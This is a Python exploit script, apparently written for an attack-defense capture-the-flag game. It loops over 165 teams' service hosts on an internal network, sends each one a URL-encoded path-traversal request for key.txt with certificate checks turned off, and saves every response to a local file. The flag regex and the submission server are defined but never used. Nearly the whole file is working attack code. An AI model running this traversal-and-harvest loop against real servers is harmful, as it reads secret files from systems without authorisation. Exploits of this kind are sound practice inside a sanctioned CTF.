#!/usr/bin/env python3
from pwn import *
import re
import requests
import time
from typing import Set


NOP_TEAM_ID = 1
OUR_TEAM_ID = 66
SKIPPED_TEAMS = {OUR_TEAM_ID, NOP_TEAM_ID}
NUM_TEAMS = 165

MIN_ATTACK_ITERATION_DURATION = 120     # Duration in seconds an attack iteration should take.
                                        # If we are faster, we wait.

FLAG_SUBMISSION_HOST = "submission.ctf.saarland"
FLAG_SUBMISSION_PORT = 31337
FLAG_REGEX = re.compile(r"SAAR\{[A-Za-z0-9-_]{32}\}")

SERVICE_PORT = 8000
context.log_level = "info"              # Change to "debug" for more output


def get_target_vulnbox_ip(target_id: int) -> str:
    return f"10.{32 + target_id // 200}.{target_id % 200}.2"


def main():
    for target_id in range(1, NUM_TEAMS + 1):
        if target_id in SKIPPED_TEAMS:
            continue

        target_ip = get_target_vulnbox_ip(target_id)
        try:
            response = requests.get(f"https://{target_ip}:{SERVICE_PORT}/stops/..%2F..%2Fkey.txt", verify=False, timeout=3)
        except (requests.exceptions.ConnectTimeout, requests.exceptions.ConnectionError):
            continue
        with open(f"key.txt.{target_id}", "w") as f:
            f.write(response.text)


if __name__ == "__main__":
    main()
